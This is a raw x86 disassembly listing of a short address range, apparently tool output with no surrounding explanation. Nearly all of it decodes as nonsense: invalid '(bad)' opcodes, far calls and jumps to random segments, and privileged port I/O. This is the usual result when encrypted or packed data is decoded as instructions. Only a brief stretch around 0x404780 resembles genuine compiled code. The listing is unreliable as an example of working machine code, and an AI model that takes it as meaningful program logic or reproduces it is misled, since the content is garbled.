  404285:	imul   ebp,DWORD PTR [ecx+eiz*2-0x4bff3429],0x69
  40428d:	pop    esp
  40428e:	cmp    ah,al
  404290:	fdivp  st(6),st
  404292:	ret    0xb0c
  404295:	xchg   esp,eax
  404296:	cmp    cl,BYTE PTR [eax-0x70f3c48f]
  40429c:	loope  0x404254
  40429e:	push   eax
  40429f:	aas    
  4042a0:	popa   
  4042a1:	mov    ebp,edi
  4042a3:	mov    ebp,0xae03616c
  4042a8:	idiv   BYTE PTR [ecx]
  4042aa:	xchg   BYTE PTR [edx+0x58],cl
  4042ad:	daa    
  4042ae:	pop    ss
  4042af:	inc    DWORD PTR [edx-0xc]
  4042b2:	ins    DWORD PTR es:[edi],dx
  4042b3:	sbb    al,0x9a
  4042b5:	pop    edx
  4042b6:	mov    ebx,0x1aeda7e9
  4042bb:	call   FWORD PTR [esi]
  4042bd:	icebp  
  4042be:	cmp    eax,0x6ec42edb
  4042c3:	dec    ebx
  4042c4:	rol    esi,0xf
  4042c7:	hlt    
  4042c8:	push   cs
  4042c9:	and    DWORD PTR [esi+0x4314604f],esp
  4042cf:	xchg   esi,eax
  4042d0:	mov    dh,0x15
  4042d2:	xchg   edx,eax
  4042d3:	test   eax,0x675e1b4b
  4042d8:	mov    DWORD PTR [esi+0x1c],0x385efaf2
  4042df:	repnz or eax,0x39d8271a
  4042e5:	inc    esp
  4042e6:	jb     0x4042a2
  4042e8:	out    dx,al
  4042e9:	mov    al,0x8e
  4042eb:	shr    esp,cl
  4042ed:	mov    esi,0x25e2f768
  4042f2:	xlat   BYTE PTR ds:[ebx]
  4042f3:	cwde   
  4042f4:	inc    ecx
  4042f5:	popf   
  4042f6:	in     al,dx
  4042f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042f8:	pushf  
  4042f9:	pop    ds
  4042fa:	pop    edx
  4042fb:	jge    0x40432b
  4042fd:	arpl   sp,sp
  4042ff:	shr    DWORD PTR [edx-0x39],1
  404302:	rol    DWORD PTR [ebx-0x60aa7cf1],0x2a
  404309:	adc    edx,edx
  40430b:	(bad)  
  40430c:	dec    BYTE PTR [ebx+ebx*8]
  40430f:	mov    eax,ds:0x4c0c45ef
  404314:	popa   
  404315:	jmp    0xa2a5345a
  40431a:	xchg   ebp,eax
  40431b:	push   0xfffffff4
  40431d:	adc    bl,BYTE PTR [eax+0x60]
  404320:	fld    DWORD PTR [eax]
  404322:	retf   
  404323:	cmp    ch,BYTE PTR [eax-0x4540bc6a]
  404329:	adc    DWORD PTR [eax+ebx*2+0x193c1fbd],0x31
  404331:	cmp    DWORD PTR ds:0xa845c87e,ecx
  404337:	or     eax,0x9f7cf6d4
  40433c:	inc    edx
  40433d:	test   esi,ebp
  40433f:	mov    al,0x7c
  404341:	sub    al,0xb7
  404343:	in     al,0x7b
  404345:	jecxz  0x404314
  404347:	test   DWORD PTR [edx],esi
  404349:	retf   
  40434a:	inc    esi
  40434b:	enter  0x803a,0x45
  40434f:	daa    
  404350:	add    esp,ebp
  404352:	pop    esi
  404353:	test   BYTE PTR [ebx+ecx*8+0xb],bl
  404357:	(bad)  
  404358:	in     al,dx
  404359:	loope  0x404343
  40435b:	popa   
  40435c:	lods   eax,DWORD PTR ds:[esi]
  40435d:	fs into 
  40435f:	jecxz  0x4042e6
  404361:	sbb    al,0x69
  404363:	push   edi
  404364:	mov    ah,0xb1
  404366:	pop    ebp
  404367:	mov    eax,ds:0x16340f1f
  40436c:	div    BYTE PTR [ecx-0x55]
  40436f:	fldcw  WORD PTR [edi+0x3b]
  404372:	cmp    al,0xb7
  404374:	lahf   
  404375:	outs   dx,DWORD PTR ds:[esi]
  404376:	call   0x5705:0xee1fe766
  40437d:	xor    dl,bh
  40437f:	push   0xebf825d
  404384:	push   ecx
  404385:	mov    bl,BYTE PTR [edx-0x5f]
  404388:	inc    edi
  404389:	call   0xd8e3:0x9aad8ea6
  404390:	jne    0x4043bd
  404392:	nop
  404393:	jae    0x4043c3
  404395:	sub    DWORD PTR [eax],esp
  404397:	dec    esi
  404398:	test   BYTE PTR [ecx],bl
  40439a:	adc    eax,0xc7605a33
  40439f:	push   edi
  4043a0:	mov    al,cl
  4043a2:	cld    
  4043a3:	mov    edi,0x4087fcdb
  4043a8:	push   cs
  4043a9:	stc    
  4043aa:	test   DWORD PTR [edi],esi
  4043ac:	add    al,al
  4043ae:	lods   eax,DWORD PTR ds:[esi]
  4043af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043b0:	add    ecx,DWORD PTR [edx]
  4043b2:	push   cs
  4043b3:	ins    DWORD PTR es:[edi],dx
  4043b4:	or     eax,0x7907edfa
  4043b9:	ficomp WORD PTR [ebx]
  4043bb:	mov    esi,0x8ae1939e
  4043c0:	or     dh,BYTE PTR [eax-0x23]
  4043c3:	xor    al,0xef
  4043c5:	or     DWORD PTR [ebx+0x38],0x92bd9c5b
  4043cc:	out    0x50,eax
  4043ce:	inc    DWORD PTR [edi-0x3e]
  4043d1:	push   edi
  4043d2:	xchg   DWORD PTR [eax+0x4c],esi
  4043d5:	sti    
  4043d6:	dec    esi
  4043d7:	ficomp DWORD PTR [ebx+0x63]
  4043da:	ror    DWORD PTR ds:0x94f1e978,1
  4043e0:	mov    ds:0x5d3123ae,al
  4043e5:	popa   
  4043e6:	daa    
  4043e7:	dec    ecx
  4043e8:	inc    ebx
  4043e9:	mov    ebp,DWORD PTR [edi+ecx*8]
  4043ec:	loop   0x40445a
  4043ee:	jbe    0x404432
  4043f0:	or     al,0x8d
  4043f2:	jg     0x4043aa
  4043f4:	add    al,0xad
  4043f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043f7:	xchg   esp,eax
  4043f8:	sahf   
  4043f9:	leave  
  4043fa:	enter  0x3fd6,0x96
  4043fe:	xor    BYTE PTR [esp+ebp*4+0x25901789],dl
  404405:	sbb    al,0x91
  404407:	lods   al,BYTE PTR ds:[esi]
  404408:	mov    ds:0x1cc9ebec,al
  40440d:	mov    BYTE PTR [ebx-0x102b44e],ch
  404413:	pop    esi
  404414:	jae    0x4043b0
  404416:	int    0xd7
  404418:	je     0x40446c
  40441a:	push   ebx
  40441b:	out    dx,eax
  40441c:	xor    DWORD PTR [edx-0x2a0253f4],eax
  404422:	xor    eax,0x3c11fdbf
  404427:	cmc    
  404428:	das    
  404429:	jns    0x404477
  40442b:	jae    0x4044ab
  40442d:	out    0x76,al
  40442f:	test   eax,0x849cb70e
  404434:	inc    eax
  404435:	jl     0x40444f
  404437:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404438:	lock imul edx,eax,0x25
  40443c:	jge    0x4043f5
  40443e:	adc    al,0x7d
  404440:	mov    ebp,0x4b074e9c
  404445:	jle    0x404422
  404447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404448:	rol    DWORD PTR [ecx+ecx*2],cl
  40444b:	aad    0x65
  40444d:	and    DWORD PTR [esi-0x30],0x77
  404451:	fnstenv ds:0x680b627f
  404457:	jne    0x40449a
  404459:	push   0x73
  40445b:	sub    eax,0xc316f582
  404460:	mov    ds:0x593d9972,eax
  404465:	loopne 0x4044aa
  404467:	cmp    BYTE PTR [ebp-0x36],ch
  40446a:	das    
  40446b:	xor    BYTE PTR [eax],dh
  40446d:	inc    esi
  40446e:	stc    
  40446f:	stos   DWORD PTR es:[edi],eax
  404470:	daa    
  404471:	xchg   edi,eax
  404472:	retf   
  404473:	aad    0x71
  404475:	ret    
  404476:	jae    0x404405
  404478:	lds    edi,FWORD PTR [edx]
  40447a:	jg     0x4044f1
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x404410
  404490:	push   ecx
  404491:	loope  0x4044b2
  404493:	pop    esi
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x404449
  40449c:	outs   dx,DWORD PTR ds:[esi]
  40449d:	or     bl,BYTE PTR [esi+0x1b]
  4044a0:	xor    BYTE PTR [eax*2-0x2b415f17],ah
  4044a7:	ror    BYTE PTR [eax-0x54],0xcf
  4044ab:	clc    
  4044ac:	std    
  4044ad:	retf   
  4044ae:	dec    ebx
  4044af:	popf   
  4044b0:	test   eax,0xa015c82a
  4044b5:	sub    BYTE PTR [eax+0x7f284ab8],0x73
  4044bc:	in     eax,0xf
  4044be:	xchg   ebx,eax
  4044bf:	cli    
  4044c0:	sub    ebp,0xffffffcb
  4044c3:	pushf  
  4044c4:	leave  
  4044c5:	push   esp
  4044c6:	pop    esp
  4044c7:	cwde   
  4044c8:	mov    ebx,0x2551ad84
  4044cd:	inc    ebp
  4044ce:	mov    ecx,esp
  4044d0:	in     eax,0x58
  4044d2:	mov    bl,BYTE PTR [eax-0x43]
  4044d5:	push   es
  4044d6:	outs   dx,DWORD PTR ds:[esi]
  4044d7:	fidivr DWORD PTR [ebx-0x30]
  4044da:	push   ebx
  4044db:	mov    esi,0x220a94ee
  4044e0:	push   0x75a24829
  4044e5:	jg     0x40454b
  4044e7:	sbb    al,0xba
  4044e9:	adc    eax,0xb2f9046b
  4044ee:	sub    edx,esi
  4044f0:	outs   dx,DWORD PTR ds:[esi]
  4044f1:	and    eax,0x7b4f5e2b
  4044f6:	xchg   ebp,eax
  4044f7:	out    dx,al
  4044f8:	xor    BYTE PTR [esp+esi*4],al
  4044fb:	div    DWORD PTR [edx+0x72bc3d8a]
  404501:	xchg   ebx,eax
  404502:	cli    
  404503:	push   0x80c3bc9d
  404508:	and    dl,BYTE PTR [ebx]
  40450a:	sub    esp,DWORD PTR [ebp*2-0x54dfc571]
  404511:	daa    
  404512:	iret   
  404513:	pop    ebx
  404514:	and    ebp,eax
  404516:	out    0xe9,al
  404518:	sahf   
  404519:	sbb    eax,0xef8a1dad
  40451e:	sub    bl,BYTE PTR [edx+eiz*4+0x6d]
  404522:	repz scas al,BYTE PTR es:[edi]
  404524:	cmp    BYTE PTR [ebp-0x55290570],dh
  40452a:	in     al,dx
  40452b:	lds    esi,FWORD PTR [ebx+0x3f8a6f12]
  404531:	sub    al,0x78
  404533:	jnp    0x4044cf
  404535:	xor    edx,DWORD PTR [ebx+0x7]
  404538:	icebp  
  404539:	and    edx,DWORD PTR [ebx+0x2b]
  40453c:	cmp    al,0x85
  40453e:	add    ecx,esi
  404540:	dec    ebp
  404541:	or     dh,BYTE PTR [esi-0x3fced36c]
  404547:	mov    eax,ds:0x4d293abe
  40454c:	pop    ds
  40454d:	sub    BYTE PTR fs:[ebx],cl
  404550:	pop    esi
  404551:	or     DWORD PTR [ebp+0x204786bb],edx
  404557:	retf   0x25a6
  40455a:	and    eax,0x6f89bdc2
  40455f:	add    BYTE PTR [ecx],0x9e
  404562:	aam    0xdd
  404564:	lods   eax,DWORD PTR ds:[esi]
  404565:	sbb    BYTE PTR [esi+ecx*1+0x28],dl
  404569:	cs ja  0x40457b
  40456c:	test   al,0x21
  40456e:	lock xlat BYTE PTR ds:[ebx]
  404570:	inc    ebp
  404571:	and    dl,bh
  404573:	mov    al,0xec
  404575:	scas   eax,DWORD PTR es:[edi]
  404576:	xchg   edx,eax
  404577:	cmp    ebp,edi
  404579:	stc    
  40457a:	ret    0xf3ee
  40457d:	add    dh,bh
  40457f:	fnstenv [edi-0x53]
  404582:	or     al,0x1
  404584:	pusha  
  404585:	(bad)  
  404586:	mov    ebx,0xa3321bfb
  40458b:	lock adc DWORD PTR [ecx],ecx
  40458e:	sub    bh,ch
  404590:	or     BYTE PTR [ebx+0x6e9de476],bl
  404596:	add    cl,BYTE PTR [ecx]
  404598:	and    cl,bl
  40459a:	fsub   QWORD PTR [ecx]
  40459c:	mov    ah,0x6b
  40459e:	hlt    
  40459f:	cmp    eax,DWORD PTR [ebx+eiz*4-0x59a385bd]
  4045a6:	add    edi,DWORD PTR [edi]
  4045a8:	push   0x1cac44d8
  4045ad:	jl     0x4045b2
  4045af:	mov    esp,0xd944c5a7
  4045b4:	cdq    
  4045b5:	out    0x20,eax
  4045b7:	cmp    al,0x6b
  4045b9:	mov    ecx,eax
  4045bb:	aaa    
  4045bc:	ret    0x585c
  4045bf:	imul   eax,edx,0x1d
  4045c2:	mov    ?,edx
  4045c4:	outs   dx,BYTE PTR ds:[esi]
  4045c5:	rcr    BYTE PTR [esi],cl
  4045c7:	imul   ecx,DWORD PTR es:[eax-0x2a8471cb],0xb4de12dc
  4045d2:	cmp    eax,0xb278dac4
  4045d7:	xchg   edx,eax
  4045d8:	mov    bh,0xd1
  4045da:	ret    0x21b3
  4045dd:	repz stc 
  4045df:	clc    
  4045e0:	push   ebx
  4045e1:	test   DWORD PTR cs:[eax+0x1a],eax
  4045e5:	mov    ebx,0x7e1ccd3
  4045ea:	or     BYTE PTR ds:0xcf789b4e,dh
  4045f1:	stos   DWORD PTR es:[edi],eax
  4045f2:	sbb    esi,DWORD PTR [edi]
  4045f4:	loopne 0x40462b
  4045f6:	out    dx,eax
  4045f7:	push   0x54
  4045f9:	jns    0x404601
  4045fb:	push   eax
  4045fc:	and    cl,BYTE PTR [eax+0x71f01507]
  404602:	scas   eax,DWORD PTR es:[edi]
  404603:	sbb    eax,0xcecd3dd7
  404608:	test   ebx,esp
  40460a:	adc    al,0xbd
  40460c:	rol    esi,0xe0
  40460f:	loop   0x404622
  404611:	rcl    DWORD PTR [esi],cl
  404613:	sar    BYTE PTR [eax],0xef
  404616:	mov    esi,0x6a084bea
  40461b:	arpl   WORD PTR [ebx+0x656c67f6],bp
  404621:	dec    esi
  404622:	mov    bl,0xfd
  404624:	cwde   
  404625:	retf   
  404626:	retf   
  404627:	lods   eax,DWORD PTR ds:[esi]
  404628:	dec    eax
  404629:	or     al,0xd5
  40462b:	cwde   
  40462c:	xor    esp,DWORD PTR [ebx]
  40462e:	jns    0x404691
  404630:	cs mov esp,0x4d782143
  404636:	push   ebx
  404637:	arpl   WORD PTR [edi],si
  404639:	popa   
  40463a:	lea    eax,[esi]
  40463c:	enter  0x3726,0x6a
  404640:	out    dx,eax
  404641:	pop    edi
  404642:	add    eax,ebx
  404644:	imul   esp,DWORD PTR [edx-0x4d],0xffffffef
  404648:	les    ebp,FWORD PTR [ecx-0x51]
  40464b:	sahf   
  40464c:	daa    
  40464d:	sbb    BYTE PTR [esi-0x7f4e60a],0x1b
  404654:	mov    ebp,DWORD PTR [ecx+0x5931968a]
  40465a:	sub    eax,0x14f44084
  40465f:	push   ecx
  404660:	mov    ebx,edi
  404662:	cmp    DWORD PTR ds:0xeebe88ca,0x5b
  404669:	fcom   st(2)
  40466b:	push   0xa1d84bc4
  404670:	mov    al,ds:0x9f7be119
  404675:	jge    0x404632
  404677:	pop    ecx
  404678:	jnp    0x40460f
  40467a:	xchg   esp,eax
  40467b:	push   eax
  40467c:	leave  
  40467d:	test   eax,0xb26c13c3
  404682:	in     eax,dx
  404683:	cmp    ecx,DWORD PTR [esi]
  404685:	xchg   edx,eax
  404686:	xchg   BYTE PTR [esi-0x751c2dcc],bh
  40468c:	xchg   DWORD PTR [edx-0x41],ebp
  40468f:	sub    BYTE PTR [ebx],0xc6
  404692:	mov    edi,0x4cbc7c43
  404697:	xor    eax,0x2c9fab11
  40469c:	sub    ebp,DWORD PTR ds:0xfe33f5c4
  4046a2:	cmp    dh,BYTE PTR [edx-0x78]
  4046a5:	loop   0x4046fc
  4046a7:	push   eax
  4046a8:	sbb    DWORD PTR [ebp-0x6ea927a0],edi
  4046ae:	add    dl,BYTE PTR [edx+0x2c]
  4046b1:	xor    al,0x1b
  4046b3:	cli    
  4046b4:	data16 (bad) 
  4046b6:	ror    DWORD PTR [ebp+esi*1+0x652d6056],cl
  4046bd:	sub    ah,dh
  4046bf:	popa   
  4046c0:	outs   dx,DWORD PTR ds:[esi]
  4046c1:	lds    edx,FWORD PTR [ebx-0x75]
  4046c4:	sbb    esi,0x77
  4046c7:	in     eax,dx
  4046c8:	pop    es
  4046c9:	mov    ebp,0xbb8e9dc
  4046ce:	dec    ebp
  4046cf:	(bad)  
  4046d0:	sahf   
  4046d1:	sub    dh,dh
  4046d3:	pushf  
  4046d4:	loop   0x4046b8
  4046d6:	popa   
  4046d7:	push   eax
  4046d8:	cmp    eax,0x214db77a
  4046dd:	test   BYTE PTR [edi],bl
  4046df:	jmp    0x4a6f:0x21a707f5
  4046e6:	dec    ebp
  4046e7:	fisttp QWORD PTR [eax]
  4046e9:	mov    edx,0xde09c545
  4046ee:	xor    DWORD PTR [eax-0x69],0x65395560
  4046f5:	enter  0xeaa2,0x3f
  4046f9:	push   ds
  4046fa:	inc    eax
  4046fb:	or     al,0xc6
  4046fd:	sbb    DWORD PTR [ecx-0x738d0c58],eax
  404703:	jmp    0xdf89:0x29d3e0d1
  40470a:	jle    0x4046b3
  40470c:	js     0x4046f4
  40470e:	pop    es
  40470f:	sar    BYTE PTR [edx+ebp*1+0x36c6b345],1
  404716:	lock dec edi
  404718:	(bad)  
  404719:	xchg   ecx,eax
  40471a:	xchg   DWORD PTR [eax-0x7cb267a2],edx
  404720:	nop
  404721:	mov    ds:0xe471a750,eax
  404726:	add    DWORD PTR [eax],ebp
  404728:	sbb    BYTE PTR [esi-0x7430565d],0xd6
  40472f:	leave  
  404730:	push   0xffffffa7
  404732:	and    ah,BYTE PTR [esi+0x3455bcb5]
  404738:	into   
  404739:	jg     0x4047b0
  40473b:	retf   
  40473c:	pop    es
  40473d:	les    esi,FWORD PTR [esp+eax*8]
  404740:	inc    esp
  404741:	into   
  404742:	push   ecx
  404743:	mov    ebp,0x11c47830
  404748:	jge    0x40471a
  40474a:	xchg   edi,eax
  40474b:	retf   
  40474c:	and    dh,BYTE PTR [esi*4-0x58417a93]
  404753:	je     0x404719
  404755:	outs   dx,BYTE PTR ds:[esi]
  404756:	pop    ecx
  404757:	mov    ds:0x11ac0cca,al
  40475c:	dec    ecx
  40475d:	daa    
  40475e:	sti    
  40475f:	and    eax,0x360ea19e
  404764:	sub    BYTE PTR [ebx-0x2fe8c7a9],0xe
  40476b:	mov    cl,0x81
  40476d:	dec    esp
  40476e:	test   DWORD PTR [esi-0x5d],ecx
  404771:	sti    
  404772:	mov    DWORD PTR [ecx+esi*8],0x9c176ab6
  404779:	adc    DWORD PTR [ebx-0x55a66b17],esp
  40477f:	in     al,dx
  404780:	repnz xor edx,eax
  404783:	add    edi,ecx
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	jecxz  0x4047cf
  4047b6:	jb     0x4047a1
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404836
  4047c1:	mov    eax,0x388212f4
  4047c6:	push   0xffffffcb
  4047c8:	xor    eax,0x377c2b54
  4047cd:	popf   
  4047ce:	scas   eax,DWORD PTR es:[edi]
  4047cf:	or     al,0xcf
  4047d1:	adc    DWORD PTR [esi+0x483d1fa0],0x8cc62be0
  4047db:	pop    esp
  4047dc:	xlat   BYTE PTR ds:[ebx]
  4047dd:	jno    0x40481b
  4047df:	mov    ds:0xd6963ec6,eax
  4047e4:	ret    0x54d1
  4047e7:	fldcw  WORD PTR [eax+0x2f]
  4047ea:	test   ebp,eax
  4047ec:	sti    
  4047ed:	or     al,0xbc
  4047ef:	push   esp
  4047f0:	fcmove st,st(2)
  4047f2:	add    ebp,DWORD PTR [ebp+esi*8+0x2b]
  4047f6:	jmp    0xf4b6:0xec728d06
  4047fd:	inc    ebx
  4047fe:	lds    ebp,FWORD PTR [edx-0x6]
  404801:	ret    
  404802:	cmc    
  404803:	(bad)  
  404804:	and    ebp,DWORD PTR [esi]
  404806:	xor    bl,BYTE PTR [ebx]
  404808:	dec    ebx
  404809:	jge    0x4047f7
  40480b:	les    esp,FWORD PTR [ecx]
  40480d:	add    BYTE PTR [esi+edi*8+0x6f],cl
  404811:	loop   0x4047d8
  404813:	dec    esi
  404814:	fstp   st(5)
  404816:	shl    cl,1
  404818:	adc    esi,DWORD PTR [esi-0x13d8c64f]
  40481e:	inc    esi
  40481f:	ins    DWORD PTR es:[edi],dx
  404820:	cmc    
  404821:	popf   
  404822:	jecxz  0x4047ba
  404824:	das    
  404825:	sub    bl,bh
  404827:	(bad)  
  404828:	stc    
  404829:	test   BYTE PTR [ecx],cl
  40482b:	dec    ebp
  40482c:	call   DWORD PTR [ecx]
  40482e:	add    edx,0xd4d307c0
  404834:	hlt    
  404835:	(bad)  
  404836:	sbb    bl,BYTE PTR [edx-0x35ea1821]
  40483c:	mov    edi,0x857a3e95
  404841:	fistp  DWORD PTR [eax]
  404843:	xor    BYTE PTR ds:0xb013208a,bh
  404849:	mov    esi,0x85c9d05
  40484e:	adc    ch,BYTE PTR [edi]
  404850:	mov    bl,0x5a
  404852:	call   0xdce4:0x856a1f63
  404859:	mov    al,0x98
  40485b:	sub    ebp,eax
  40485d:	addr16 mov ebp,esp
  404860:	mov    bl,0xa5
  404862:	xchg   ebp,eax
  404863:	scas   al,BYTE PTR es:[edi]
  404864:	sbb    eax,0xc7065af5
  404869:	call   0xba77:0x54bcdab
  404870:	imul   eax,edx,0x29eb213b
  404876:	mov    ebp,0x8a10d4b3
  40487b:	repnz pop ecx
  40487d:	je     0x404858
  40487f:	adc    dh,ah
  404881:	xchg   esi,eax
  404882:	xor    BYTE PTR [ecx-0x4a646a96],cl
  404888:	retfw  
  40488a:	cmovnp ebx,DWORD PTR [edx-0x2b]
  40488e:	sbb    esp,DWORD PTR [edi+0x6]
  404891:	mov    bl,0x40
  404893:	or     dh,0x4c
  404896:	mov    ebx,0x24496678
  40489b:	jnp    0x4048e1
  40489d:	in     al,dx
  40489e:	mov    eax,0x705c047c
  4048a3:	xor    dh,ah
  4048a5:	clc    
  4048a6:	es push ebp
  4048a8:	mov    edx,0xab099ccc
  4048ad:	int    0x9f
  4048af:	clc    
  4048b0:	loopne 0x40484c
  4048b2:	xchg   esp,eax
  4048b3:	fcomi  st,st(2)
  4048b5:	push   edi
  4048b6:	fsub   DWORD PTR [ebp-0x2d]
  4048b9:	jmp    0xfe98effb
  4048be:	fstp   QWORD PTR [esp+ecx*4-0x1e1a9e3d]
  4048c5:	lods   al,BYTE PTR ds:[esi]
  4048c6:	int    0x59
  4048c8:	or     ebp,DWORD PTR [ebp+ebx*8-0x29a5d682]
  4048cf:	add    eax,0x3020ec83
  4048d4:	xchg   DWORD PTR [ecx+0x1f],ebx
  4048d7:	mov    dh,0xef
  4048d9:	cs xchg edi,eax
  4048db:	repz cmp eax,0xcbc2026f
  4048e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e2:	mul    BYTE PTR [ecx]
  4048e4:	add    eax,0xf442a6cb
  4048e9:	xchg   ebx,eax
  4048ea:	cmp    ah,cl
  4048ec:	nop
  4048ed:	mov    edi,0x1e79de67
  4048f2:	fdivr  st(7),st
  4048f4:	daa    
  4048f5:	not    bl
  4048f7:	loope  0x404906
  4048f9:	stos   DWORD PTR es:[edi],eax
  4048fa:	or     edi,DWORD PTR [edi-0x6]
  4048fd:	push   ds
  4048fe:	call   0xc297:0x57f41021
  404905:	sub    bh,cl
  404907:	jg     0x4048af
  404909:	in     eax,0xae
  40490b:	mov    esp,0x9252bee2
  404910:	aas    
  404911:	mov    ds:0x6117896d,eax
  404916:	jbe    0x404928
  404918:	test   eax,0xc5c8d082
  40491d:	scas   eax,DWORD PTR es:[edi]
  40491e:	xchg   edi,eax
  40491f:	outs   dx,DWORD PTR ds:[esi]
  404920:	mov    DWORD PTR [esi+0x57],ebp
  404923:	popf   
  404924:	xchg   BYTE PTR [esi-0x28],ch
  404927:	sub    al,0x2a
  404929:	repz call 0x9e049561
  40492f:	fwait
  404930:	sahf   
  404931:	repnz in eax,0x50
  404934:	cmovbe ebp,DWORD PTR [ebp-0x201aca6]
  40493b:	fwait
  40493c:	cmp    DWORD PTR es:[edx],esp
  40493f:	out    0x2e,al
  404941:	adc    al,ch
  404943:	pop    ebp
  404944:	jmp    0x4049a3
  404946:	mov    ds:0x7bc28272,al
  40494b:	ret    0x766c
  40494e:	(bad)  
  40494f:	fbstp  TBYTE PTR [esi+esi*1]
  404952:	dec    ecx
  404953:	aas    
  404954:	sub    eax,0xcd893a51
  404959:	daa    
  40495a:	inc    esp
  40495b:	rcr    DWORD PTR [ecx+0x7b],0xf7
  40495f:	dec    esi
  404960:	and    BYTE PTR [ecx],cl
  404962:	pop    edx
  404963:	daa    
  404964:	and    DWORD PTR [edi-0x3157225c],esi
  40496a:	enter  0xa6ca,0x76
  40496e:	sub    dh,dl
  404970:	add    al,0xcd
  404972:	ret    0x7b82
  404975:	add    BYTE PTR [eax],0x48
  404978:	repz xchg esp,eax
  40497a:	sbb    BYTE PTR [edx-0x16],ah
  40497d:	test   ch,dl
  40497f:	jp     0x4049c2
  404981:	pop    esi
  404982:	sub    DWORD PTR [ecx-0x52],esp
  404985:	add    dh,BYTE PTR [ebp+0x36]
  404988:	pop    ecx
  404989:	dec    eax
  40498a:	xchg   esp,eax
  40498b:	aaa    
  40498c:	enter  0xcd4e,0x54
  404990:	add    al,0x1d
  404992:	dec    esi
  404993:	retf   0x9508
  404996:	mov    eax,0x73591f20
  40499b:	fnsave [ebp-0x7f]
  40499e:	std    
  40499f:	jnp    0x40498c
  4049a1:	in     al,dx
  4049a2:	inc    ecx
  4049a3:	jle    0x404a12
  4049a5:	sti    
  4049a6:	cld    
  4049a7:	and    eax,0x30d870a1
  4049ac:	push   ebp
  4049ad:	mov    ah,0x3
  4049af:	jne    0x404995
  4049b1:	clc    
  4049b2:	jp     0x40498e
  4049b4:	ds enter 0x39c9,0xb3
  4049b9:	add    BYTE PTR [edi+0x24],dl
  4049bc:	xchg   ebx,eax
  4049bd:	mov    al,0xb9
  4049bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049c0:	inc    ebx
  4049c1:	sbb    esi,0xc
  4049c4:	arpl   WORD PTR [esi],cx
  4049c6:	add    eax,esi
  4049c8:	sti    
  4049c9:	nop
  4049ca:	mov    al,0xd3
  4049cc:	push   0x7c09702b
  4049d1:	adc    DWORD PTR [eax-0x171e3b75],ebx
  4049d7:	fild   QWORD PTR [esi+ecx*4-0x4bbe5617]
  4049de:	sahf   
  4049df:	sar    DWORD PTR [ebx],0xe5
  4049e2:	mov    ecx,0xa5d9053a
  4049e7:	mov    esi,0x6f4849a
  4049ec:	push   eax
  4049ed:	stos   DWORD PTR es:[edi],eax
  4049ee:	jecxz  0x40498e
  4049f0:	push   eax
  4049f1:	push   eax
  4049f2:	push   ecx
  4049f3:	int    0x99
  4049f5:	aad    0xc6
  4049f7:	outs   dx,BYTE PTR ds:[esi]
  4049f8:	es test al,0x77
  4049fb:	stos   DWORD PTR es:[edi],eax
  4049fc:	fbld   TBYTE PTR [esi+0x553b827b]
  404a02:	fcom   DWORD PTR [ecx]
  404a04:	inc    edi
  404a05:	pop    ecx
  404a06:	push   esp
  404a07:	xchg   esi,eax
  404a08:	push   es
  404a09:	cs dec edi
  404a0b:	imul   edi,DWORD PTR [ecx],0x47
  404a0e:	dec    edi
  404a0f:	pop    eax
  404a10:	mov    bh,0xdc
  404a12:	jns    0x4049bf
  404a14:	adc    ecx,ecx
  404a16:	cmp    cl,cl
  404a18:	adc    DWORD PTR [edx+0x41628339],esi
  404a1e:	xchg   esp,eax
  404a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a20:	add    DWORD PTR [ebx],ecx
  404a22:	mov    cl,al
  404a24:	out    0xa0,eax
  404a26:	jno    0x404a87
  404a28:	or     esp,DWORD PTR [eax-0x39]
  404a2b:	jo     0x4049d1
  404a2d:	pop    eax
  404a2e:	mov    cl,0x40
  404a30:	cli    
  404a31:	lahf   
  404a32:	loop   0x4049c6
  404a34:	sbb    ch,dl
  404a36:	mov    dl,ah
  404a38:	cli    
  404a39:	or     esp,DWORD PTR [esi+0x2c]
  404a3c:	iret   
  404a3d:	test   esi,ecx
  404a3f:	ret    
  404a40:	jl     0x404a1a
  404a42:	add    DWORD PTR [ecx-0x23aa02ec],ebx
  404a48:	test   al,0x90
  404a4a:	sbb    al,0x56
  404a4c:	dec    edi
  404a4d:	pop    DWORD PTR [ecx-0x7fa38fc7]
  404a53:	daa    
  404a54:	dec    esi
  404a55:	addr16 (bad) 
  404a57:	std    
  404a58:	aam    0x51
  404a5a:	or     DWORD PTR [edx-0x5e],ecx
  404a5d:	ror    dl,cl
  404a5f:	gs push edi
  404a61:	jmp    DWORD PTR [ebp-0xec1d65a]
  404a67:	push   0xc
  404a69:	punpckldq mm4,DWORD PTR [bx+si-0x68ea]
  404a6f:	push   esp
  404a70:	xor    DWORD PTR [edi+0x676cfded],edx
  404a76:	push   0xfffffff5
  404a78:	push   esp
  404a79:	arpl   WORD PTR [ecx],sp
  404a7b:	cld    
  404a7c:	icebp  
  404a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a7e:	in     eax,dx
  404a7f:	jmp    0x68514168
  404a84:	push   ds
  404a85:	(bad)  
